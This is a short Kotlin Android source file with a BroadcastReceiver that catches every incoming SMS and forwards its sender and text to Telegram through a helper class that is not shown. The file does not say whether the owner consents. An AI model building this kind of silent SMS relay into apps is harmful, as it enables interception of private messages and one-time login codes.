package com.example.myapplication2

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action.equals(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)) {
            // Получить сообщение SMS
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)

            // Обработать сообщение и отправить в Telegram
            for (message in messages) {
                val sender = message.displayOriginatingAddress
                val body = message.messageBody

                // Отправить в Telegram
                val telegramSender = TelegramSenderMessage()
                telegramSender.sendMessage(sender, body)  // Отправка сообщения

               // TelegramSender.sendMessage(sender, body)
            }
        }
    }
}
